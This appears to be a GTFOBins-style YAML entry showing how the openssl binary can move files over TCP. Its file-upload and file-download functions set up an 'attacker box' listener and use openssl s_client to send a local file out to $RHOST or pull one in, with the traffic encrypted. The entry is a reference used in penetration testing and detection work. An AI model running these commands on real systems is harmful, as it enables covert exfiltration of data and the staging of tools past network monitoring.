---
functions:
  file-upload:
    - description: |
        To collect the file run the following on the attacker box:

            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
            openssl s_server -quiet -key key.pem -cert cert.pem -port 4444 > file_to_save

        Send a local file via TCP. Transmission will be encrypted.
      code: |
        openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
  file-download:
    - description: |
        To send the file run the following on the attacker box:

            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
            openssl s_server -quiet -key key.pem -cert cert.pem -port 4444 < file_to_send

        Fetch a file from a TCP port, transmission will be encrypted.
      code: |
        openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
---
